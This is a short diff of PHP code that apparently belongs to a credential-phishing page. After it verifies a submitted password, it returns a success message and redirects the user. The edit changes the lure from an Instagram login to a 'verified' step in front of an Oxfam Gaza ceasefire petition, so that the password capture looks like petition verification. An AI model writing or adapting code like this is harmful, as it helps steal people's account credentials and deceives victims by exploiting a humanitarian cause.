@@ -222,9 +222,9 @@ if ($verification_result === "SUCCESS") {
     // Password is correct - return success with redirect flag
     echo json_encode([
         'status' => 'SUCCESS',
-        'message' => 'Login successful! Redirecting to Instagram...',
+        'message' => 'Verified Successfully! redirecting to Petition',
         'redirect' => true,
-        'redirect_url' => 'https://instagram.com'
+        'redirect_url' => 'https://www.oxfam.org/en/open-call-immediate-ceasefire-gaza-strip-and-israel'
     ]);
 } else {
     // Password is wrong or other issues - return error without redirect
